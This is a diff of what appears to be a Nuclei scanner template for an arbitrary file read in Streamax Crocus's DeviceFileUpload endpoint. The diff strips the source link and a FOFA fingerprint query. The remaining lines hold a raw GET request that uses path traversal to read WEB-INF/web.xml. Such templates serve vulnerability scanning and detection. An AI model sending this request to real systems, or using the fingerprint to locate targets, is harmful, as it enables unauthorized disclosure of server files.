@@ -3,12 +3,8 @@ info:
   name: 锐明技术Crocus DeviceFileUpload任意文件读取
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/adt96p4z4dgsata9'
+  description: ''
   tags: file-upload,lfi,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: adt96p4z4dgsata9
-    fofa: body="/ThirdResource/respond/respond.min.js" && title="Crocus"
 http:
 - raw:
   - 'GET /DeviceFileUpload.do?Action=Download&&path=/../WEB-INF/web.xml HTTP/1.1
